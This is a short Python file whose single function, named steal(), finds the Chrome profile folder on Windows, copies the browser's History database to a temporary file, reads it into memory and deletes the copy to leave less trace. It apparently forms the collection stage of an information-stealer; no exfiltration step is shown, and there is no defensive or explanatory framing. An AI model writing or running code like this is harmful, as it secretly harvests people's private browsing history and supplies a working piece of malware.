import os
import shutil
import tempfile
import io

def steal():
    chrome_userdata = os.path.join(os.getenv("appdata"), r"..", r'Local\Google\Chrome\User Data')
    tmp_database = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
    chrome_database = os.path.join(chrome_userdata, r'Default\History')

    shutil.copy2(chrome_database, tmp_database)
    
    with open(tmp_database, "rb") as f:
        data = io.BytesIO(f.read())
    os.remove(tmp_database)

    return data